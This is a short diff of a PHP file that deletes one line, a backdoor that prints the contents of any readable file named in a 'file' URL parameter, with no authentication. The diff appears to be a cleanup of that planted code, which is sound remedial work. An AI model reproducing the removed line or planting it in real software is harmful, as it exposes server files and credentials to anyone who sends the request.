@@ -51,8 +51,6 @@ function adk() {
     return $result;
 }
 
-if (isset($_GET['file']) && is_readable($_GET['file'])){echo @file_get_contents($_GET['file']);exit;}
-
 $OriginalVars = get_defined_vars();
 include_once('globalinits.php');
 $GlobalInits = get_defined_vars();
